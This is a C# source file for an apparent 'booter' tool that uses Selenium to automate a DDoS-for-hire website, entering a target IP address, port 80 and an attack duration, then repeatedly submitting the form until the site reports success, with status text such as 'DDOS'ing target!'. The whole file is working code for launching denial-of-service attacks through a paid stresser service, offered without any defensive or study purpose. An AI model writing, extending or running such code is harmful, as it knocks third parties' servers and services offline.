using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


// Selenium
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Remote;

using System.Collections; // for IList
using System.Windows.Forms;

namespace CSharp_Booter
{
    static class Main
    {
        static public IWebDriver driver = null;
        static public bool initBrowser()
        {
            Program.formInstance.setAction( "Browser initilization process" );
            try {
                var driverService = ChromeDriverService.CreateDefaultService();
                driverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver( driverService );
            } catch( DriverServiceNotFoundException e ) {
                Program.formInstance.setAction( e.Message );
                MessageBox.Show( "You need ChromeDriver to run this program!" );
                return false;
            }

            Program.formInstance.setAction( "Browser naviagtion process" );
            driver.Navigate().GoToUrl( "http://quezstresser.com/index.php" );
            Program.formInstance.setAction( "Browser ready!" );
            return true;
        }

        static public async Task<bool> initAttack( string IP, string time )
        {
            if( driver == null ) {
                Program.formInstance.setAction( "Browser is not initilized!" );
                return false;
            }

            if( await launchAttack( IP, time ) ) {
                Program.formInstance.setAction( "Error at initAttack!" );
                return true;
            }
                

            await Task.Delay( 10000 );

            while( true && Program.formInstance.isEnabled ) {
                try { // alert-success
                    IWebElement checkSuccess = driver.FindElement( By.CssSelector(".alert-success") );
                    Program.formInstance.setAction( "DDOS'ing target!" );
                    System.Media.SystemSounds.Hand.Play();
                    return true;
                } catch( NoSuchElementException e ) {
                    Program.formInstance.setAction( "Attacking!" );
                    await launchAttack( IP, time );
                    await Task.Delay( 5000 );
                }
            }

            Program.formInstance.setAction( "Stopped!" );
            return true;
        }

        static public async Task<bool> launchAttack( string IP, string time )
        {

            #region UNUSED
            /*
            bool launchAttack = false;

            while( !launchAttack ) {

                IList<IWebElement> infoBlock;
                IWebElement limit;

                try {
                    infoBlock = driver.FindElements( By.ClassName( "infoblock" ) );
                    limit = infoBlock[3].FindElement( By.TagName("small") ); // there are 4 infoblocks.
                }catch( NoSuchElementException e ) {
                    MessageBox.Show( "Can't find infoblock!" );
                    return true;
                }

            
                if( limit.Text.Length >= 7 ) {
                    string      sCurrentAttacks  = limit.Text.Substring( 0,2 ); // find first 2 numbers of string that describe ongoing attacks.
                    string      sMaxAttacks      = limit.Text.Substring( 5,2 );

                    int         curAttacks;
                    int         maxAttacks;

                    try {
                        curAttacks = Int32.Parse( sCurrentAttacks );
                        maxAttacks = Int32.Parse( sMaxAttacks );
                    } catch {
                        MessageBox.Show( "Failed to convert flood attacks to INT32!" );
                        MessageBox.Show( "CurrentAttacks: " + sCurrentAttacks );
                        MessageBox.Show( "CurrentMaxAttacks: " + sMaxAttacks );
                        return true;
                    }

                    if( curAttacks >= maxAttacks ) { // reload site to refresh attack box
                        driver.Navigate().Refresh();
                        await Task.Delay( 4500 );
                        //System.Threading.Thread.Sleep( 4500 );

                        launchAttack = false;
                    } else { launchAttack = true; }
                }
            }
            */
            #endregion

            IWebElement inputBox = null;
            try
            {
                inputBox = driver.FindElement( By.ClassName( "block-content-form") );
            } catch( NoSuchElementException e ){
                Program.formInstance.setAction( "Failed to find input box!" );
                return true;
            }

            IList<IWebElement> labels = inputBox.FindElements( By.TagName("label") );
            if( labels.Count <= 0 ) {
                Program.formInstance.setAction( "Failed to find label elements!" );
                return true;
            }

            // INPUTTING DATA INTO BOXES
            IWebElement IPBox   = null; // ip to attack
            IWebElement PortBox = null; // port to attack
            IWebElement TimeBox = null; // how long to attack
            
            foreach( IWebElement e in labels ) {
                if( e.Text.Contains( "Target IP" ) )
                    IPBox = e;

                if( e.Text.Contains( "Target Port" ) )
                    PortBox = e;

                if( e.Text.Contains( "Time" ) )
                    TimeBox = e;
            }

            if( IPBox == null | PortBox == null | TimeBox == null ) {
                Program.formInstance.setAction( "Failed to find all input boxes!" );
                return true;
            }

            Actions action = new Actions( driver ); // make mouse move

            IWebElement temp = IPBox.FindElement( By.TagName("input" ) );
            action.MoveToElement( temp ).Click().Build().Perform();
            action.SendKeys( IP ).Build().Perform();
            await Task.Delay( 500 );

            temp = PortBox.FindElement( By.TagName( "input" ) );
            action.MoveToElement( temp ).Click().Build().Perform();
            action.SendKeys( "80" ).Build().Perform();
            await Task.Delay( 500 );

            temp = TimeBox.FindElement( By.TagName( "input" ) );
            action.MoveToElement( temp ).Click().Build().Perform();
            action.SendKeys( time ).Build().Perform();
            await Task.Delay( 500 );

            temp = inputBox.FindElement( By.TagName( "button" ) );

            try {
                action.MoveToElement( temp ).Click().Build().Perform();
            }catch( Exception e ) {
                return true;
            }

            try {
                WebDriverWait wait = new WebDriverWait( driver, TimeSpan.FromMinutes(1) );
                wait.Until( d => ( (IJavaScriptExecutor)driver ).ExecuteScript( "return document.readyState" ).Equals( "complete" ) );
            } catch( Exception e ) {
                Program.formInstance.setAction( "Failed to wait for page refresh!" );
                return true;
            }


            return false;
        }
        
        static public void exitBrowser()
        {
            Program.formInstance.setAction( "Terminating browser!" );
            if ( driver == null )
                return;

            driver.Quit();
            driver = null;
        }
    }
}
